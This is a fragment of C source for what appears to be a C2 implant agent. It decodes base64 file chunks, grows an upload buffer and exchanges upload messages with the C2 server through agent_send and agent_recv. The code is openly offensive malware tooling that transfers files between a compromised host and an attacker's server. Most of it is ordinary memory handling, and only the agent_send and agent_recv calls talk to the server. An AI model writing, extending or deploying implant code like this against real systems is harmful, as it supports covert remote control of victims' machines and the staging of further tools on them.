	// Compute the actual decoded length: base64 gives 3 bytes per 4 chars, minus padding.
	size_t enc_len = MSVCRT$strlen(encoded_chunk_data);
	size_t dec_len = (enc_len / 4) * 3;
	if (enc_len > 0 && encoded_chunk_data[enc_len - 1] == '=') { dec_len--; }
	if (enc_len > 1 && encoded_chunk_data[enc_len - 2] == '=') { dec_len--; }
	
	char *decoded_chunk_data = KERNEL32$VirtualAlloc(0, upload->chunk_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (enc_len > 0) {
		base64_decode(encoded_chunk_data, enc_len, decoded_chunk_data);
	}
	
	// If there isn't enough capacity, reallocate the buffer.
	if ((upload->buflen + dec_len) > upload->bufsize) {
		size_t new_size = upload->bufsize + upload->chunk_size;
		char *new_buffer = KERNEL32$VirtualAlloc(0, new_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < upload->buflen; i++) {
			new_buffer[i] = upload->current_buffer[i];
		}
		KERNEL32$VirtualFree(upload->current_buffer, 0, MEM_RELEASE);
		upload->current_buffer = new_buffer;
		upload->bufsize = new_size;
		
	}
	
	// Copy only the actual decoded bytes across (the final chunk may be shorter than chunk_size).
	for (size_t i = 0; i < dec_len; i++) {
		upload->current_buffer[upload->buflen + i] = decoded_chunk_data[i];
	}
	upload->buflen += dec_len;
	
	KERNEL32$VirtualFree(decoded_chunk_data, 0, MEM_RELEASE);
}

void free_upload_manager(UploadManager *upload) {
	if (upload->callback_uuid != NULL) { KERNEL32$VirtualFree(upload->callback_uuid, 0, MEM_RELEASE); }
	if (upload->task_id != NULL) { KERNEL32$VirtualFree(upload->task_id, 0, MEM_RELEASE); }
	if (upload->file_uuid != NULL) { KERNEL32$VirtualFree(upload->file_uuid, 0, MEM_RELEASE); }
	if (upload->current_buffer != NULL) { KERNEL32$VirtualFree(upload->current_buffer, 0, MEM_RELEASE); }
}

BOOL perform_upload(AgentState *state, UploadManager *upload) {
	// Generate upload payload.
	int msg_len = 0;
	char *msg = generate_upload_message(upload, &msg_len);
	
	// Send upload payload to C2 server (always POST).
	HttpResponse response = {0};
	
	BOOL result = agent_send(state, state->params.callback_uuid, msg, msg_len, FALSE, &response);
	
	if (result == TRUE && response.status_code == 200) {
		int reply_len = 0;
		char *decoded = agent_recv(state, &response, &reply_len);
		if (decoded != NULL) {
			parse_upload_reply(decoded, reply_len, upload);
			KERNEL32$VirtualFree(decoded, 0, MEM_RELEASE);
		} else {
			result = FALSE;
		}
	} else {
		result = FALSE;
	}
	
	// Free unneeded allocations.
	// Unlike the other perform_x() functions, we don't need to free the upload manager because it will be reused!
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	MSVCRT$free(response.body);
	MSVCRT$free(response.content_type);
	
	return result;
}
